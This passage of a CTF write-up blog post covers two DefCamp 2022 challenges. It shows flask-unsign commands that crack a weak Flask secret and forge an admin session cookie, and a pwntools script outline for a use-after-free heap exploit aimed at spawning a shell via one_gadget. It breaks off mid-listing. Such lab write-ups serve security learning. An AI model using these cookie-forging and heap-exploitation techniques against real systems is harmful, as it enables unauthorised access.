@@ -1,0 +1,1219 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <title>DefCamp CTF 2022 | Chovid99&#39;s Blog</title>
+
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    
+<meta name="viewport" content="width=device-width,minimum-scale=1">
+<meta name="description" content="Writeup for DefCamp CTF 2022 by Chovid99">
+<meta name="generator" content="Hugo 0.95.0" />
+
+
+  <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+
+
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/css/tocbot.css">
+
+
+
+<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+
+ 
+    
+
+
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
+    onload="renderMathInElement(document.body);"></script>
+
+
+
+
+
+  </head>
+
+  <body>
+    <nav class="navigation">
+	
+		<a href="/"> <span class="arrow">←</span>Home</a>
+	
+	<a href="/posts">Posts</a>
+	<a href="/tags">Tags</a>
+	<a href="/about">About</a>
+
+	
+
+	
+</nav>
+
+
+    <main class="main">
+      
+
+<section id="single">
+    <h1 class="title">DefCamp CTF 2022</h1>
+
+    <div class="tip">
+        <time datetime="2022-02-14 20:02:14 &#43;0700 WIB">Feb 14, 2022</time>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          2963 words
+        </span>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          14 minute read
+        </span>
+    </div>
+
+    <div class="content">
+      <div class="post-content js-toc-content">
+        <p>On this CTF, I only managed to solve two challenges, the web-intro and cache challenge. However, I&rsquo;m super happy doing this CTF because I learned a lot about heap during doing this CTF. Kudos to the organizers! Here is my writeup for those two challenges.</p>
+<h1 id="web">Web <a href="#web" class="anchor">#</a></h1>
+<h2 id="web-intro">web-intro <a href="#web-intro" class="anchor">#</a></h2>
+<p>We were given a flask website, where it only show Access Denied. Checking the cookie, we notice it contains the session. Using flask unsign, we try to bruteforce the secret, and found it.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flask-unsign --unsign --cookie eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgY8Ag.brYMgM6ScmEf9me5I0-BKia5QTs
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flask-unsign --sign --cookie <span style="color:#c30">&#34;{&#39;logged_in&#39;: True}&#34;</span> --secret <span style="color:#c30">&#39;password&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Flag: CTF{66bf8ba5c3ee2bd230f5cc2de57c1f09f471de8833eae3ff7566da21eb141eb7}</p>
+</blockquote>
+<h1 id="pwn">Pwn <a href="#pwn" class="anchor">#</a></h1>
+<h2 id="cache">Cache <a href="#cache" class="anchor">#</a></h2>
+<blockquote>
+<p>Disclaimer: This is my first time ever doing heap challenge, I spend a lot of time on learning while doing, so I&rsquo;m sorry if I made some mistake during explaining my solution. Would love to have your comments or feedbacks if you found some misinformations on my writeup.</p>
+</blockquote>
+<h3 id="intro">Intro <a href="#intro" class="anchor">#</a></h3>
+<p>We were given a libc and a binary file called <code>vuln</code>.
+Checking the given libc, we know that the glibc version is <code>2.27</code></p>
+<h3 id="initial-analysis">Initial analysis <a href="#initial-analysis" class="anchor">#</a></h3>
+<p>Here is the result of the decompilation with Ghidra</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">main</span>(EVP_PKEY_CTX <span style="color:#555">*</span>param_1)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> local_24;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>student_pointer;
+</span></span><span style="display:flex;"><span>  code <span style="color:#555">**</span>admin_pointer;
+</span></span><span style="display:flex;"><span>  undefined8 local_10;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
+</span></span><span style="display:flex;"><span>  student_pointer <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>;
+</span></span><span style="display:flex;"><span>  admin_pointer <span style="color:#555">=</span> (code <span style="color:#555">**</span>)<span style="color:#f60">0x0</span>;
+</span></span><span style="display:flex;"><span>  init(param_1);
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">do</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">while</span>( <span style="color:#366">true</span> ) {
+</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">while</span>( <span style="color:#366">true</span> ) {
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">while</span>( <span style="color:#366">true</span> ) {
+</span></span><span style="display:flex;"><span>          puts(<span style="color:#c30">&#34;MENU&#34;</span>);
+</span></span><span style="display:flex;"><span>          puts(<span style="color:#c30">&#34;1: Make new admin&#34;</span>);
+</span></span><span style="display:flex;"><span>          puts(<span style="color:#c30">&#34;2: Make new user&#34;</span>);
+</span></span><span style="display:flex;"><span>          puts(<span style="color:#c30">&#34;3: Print admin info&#34;</span>);
+</span></span><span style="display:flex;"><span>          puts(<span style="color:#c30">&#34;4: Edit Student Name&#34;</span>);
+</span></span><span style="display:flex;"><span>          puts(<span style="color:#c30">&#34;5: Print Student Name&#34;</span>);
+</span></span><span style="display:flex;"><span>          puts(<span style="color:#c30">&#34;6: Delete admin&#34;</span>);
+</span></span><span style="display:flex;"><span>          puts(<span style="color:#c30">&#34;7: Delete user&#34;</span>);
+</span></span><span style="display:flex;"><span>          printf(<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">Choice: &#34;</span>);
+</span></span><span style="display:flex;"><span>          fflush(stdout);
+</span></span><span style="display:flex;"><span>          __isoc99_scanf(<span style="color:#c30">&#34;%d%*c&#34;</span>,<span style="color:#555">&amp;</span>local_24);
+</span></span><span style="display:flex;"><span>          <span style="color:#069;font-weight:bold">if</span> (local_24 <span style="color:#555">!=</span> <span style="color:#f60">1</span>) <span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>          admin_pointer <span style="color:#555">=</span> (code <span style="color:#555">**</span>)malloc(<span style="color:#f60">0x10</span>);
+</span></span><span style="display:flex;"><span>          admin_pointer[<span style="color:#f60">1</span>] <span style="color:#555">=</span> admin_info;
+</span></span><span style="display:flex;"><span>          <span style="color:#555">*</span>admin_pointer <span style="color:#555">=</span> getFlag;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (local_24 <span style="color:#555">!=</span> <span style="color:#f60">2</span>) <span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>        student_pointer <span style="color:#555">=</span> malloc(<span style="color:#f60">0x10</span>);
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#c30">&#34;What is your name: &#34;</span>);
+</span></span><span style="display:flex;"><span>        fflush(stdout);
+</span></span><span style="display:flex;"><span>        read(<span style="color:#f60">0</span>,student_pointer,<span style="color:#f60">0x10</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (local_24 <span style="color:#555">!=</span> <span style="color:#f60">3</span>) <span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>      (<span style="color:#555">*</span>admin_pointer[<span style="color:#f60">1</span>])();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (local_24 <span style="color:#555">==</span> <span style="color:#f60">4</span>) {
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#c30">&#34;What is your name: &#34;</span>);
+</span></span><span style="display:flex;"><span>      fflush(stdout);
+</span></span><span style="display:flex;"><span>      read(<span style="color:#f60">0</span>,student_pointer,<span style="color:#f60">0x10</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> <span style="color:#069;font-weight:bold">if</span> (local_24 <span style="color:#555">==</span> <span style="color:#f60">5</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (student_pointer <span style="color:#555">==</span> (<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>) {
+</span></span><span style="display:flex;"><span>        puts(<span style="color:#c30">&#34;New student has not been created yet&#34;</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#c30">&#34;Students name is %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,student_pointer);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> <span style="color:#069;font-weight:bold">if</span> (local_24 <span style="color:#555">==</span> <span style="color:#f60">6</span>) {
+</span></span><span style="display:flex;"><span>      free(admin_pointer);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> <span style="color:#069;font-weight:bold">if</span> (local_24 <span style="color:#555">==</span> <span style="color:#f60">7</span>) {
+</span></span><span style="display:flex;"><span>      free(student_pointer);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>      puts(<span style="color:#c30">&#34;bad input&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  } <span style="color:#069;font-weight:bold">while</span>( <span style="color:#366">true</span> );
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Reading the decompilation result, we notice some bug.</p>
+<ul>
+<li>Use After Free on admin and student pointer (Because after being freed, the pointer is not set to null).</li>
+<li>Double Free due to previous bug and the glibc version</li>
+<li>We can easily call a function by calling the menu 3 (print admin info)</li>
+</ul>
+<h3 id="pitfall-solution">Pitfall solution <a href="#pitfall-solution" class="anchor">#</a></h3>
+<p>To make our life easier, let&rsquo;s make a wrapper in python to do that:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>libc <span style="color:#555">=</span> ELF(<span style="color:#c30">&#39;./libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> process(<span style="color:#c30">&#39;./vuln&#39;</span>, env<span style="color:#555">=</span>{})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">print_student</span>():
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Choice: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;5&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;is &#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">new_admin</span>():
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Choice: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">free_admin</span>():
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Choice: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;6&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">get_shell</span>():
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Choice: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">new_student</span>(name):
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Choice: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;: &#39;</span>, name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">edit_student</span>(name):
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Choice: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;: &#39;</span>, name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">free_student</span>():
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Choice: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;7&#39;</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Skimming the decompiled code, it seems the solution that we need is only abusing the UAF bug:</p>
+<ul>
+<li>Create Admin</li>
+<li>Free it (then the chunk goes to tcache because the malloc size is 0x10)</li>
+<li>Create User where the last 8 byte is the <code>getFlag</code> address</li>
+<li>Call Print Admin Info (Because <code>admin_pointer</code> and <code>student_pointer</code> is pointing to the same chunk, hence call Print Admin Info will call <code>getFlag</code>).</li>
+</ul>
+<p>After I did the above steps, turn out the printed flag was a fake flag.
+<p class="markdown-image">
+  <img src="https://i.imgur.com/OZxjkR9.jpg" alt=""  />
+</p></p>
+<h3 id="further-analysis">Further analysis <a href="#further-analysis" class="anchor">#</a></h3>
+<p>Seems like we need to trigger shell to look around for the real flag. Basically, our target is to do the above steps, but instead of putting the <code>getFlag</code> address, we trigger the shell.</p>
+<h4 id="idea-explanation">Idea explanation <a href="#idea-explanation" class="anchor">#</a></h4>
+<p>In order to do that, first I try to find <code>execve(&quot;/bin/sh&quot;</code> on the given libc with <code>one_gadget</code>. We found some candidates.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x4f2c5 execve<span style="color:#555">(</span><span style="color:#c30">&#34;/bin/sh&#34;</span>, rsp+0x40, environ<span style="color:#555">)</span>
+</span></span><span style="display:flex;"><span>constraints:
